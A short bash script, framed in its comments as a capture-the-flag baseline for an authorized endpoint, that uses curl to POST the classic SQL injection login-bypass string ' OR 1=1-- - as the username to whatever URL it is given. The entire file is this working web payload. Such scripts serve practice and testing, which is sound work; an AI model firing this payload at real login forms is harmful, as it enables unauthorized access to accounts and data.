#!/usr/bin/env bash
# Send a CTF SQLi baseline to an authorized endpoint.
# Usage: read the corresponding command in the field manual.
set -u
curl -sk -X POST "$1" --data-urlencode "username=' OR 1=1-- -" --data-urlencode 'password=x'
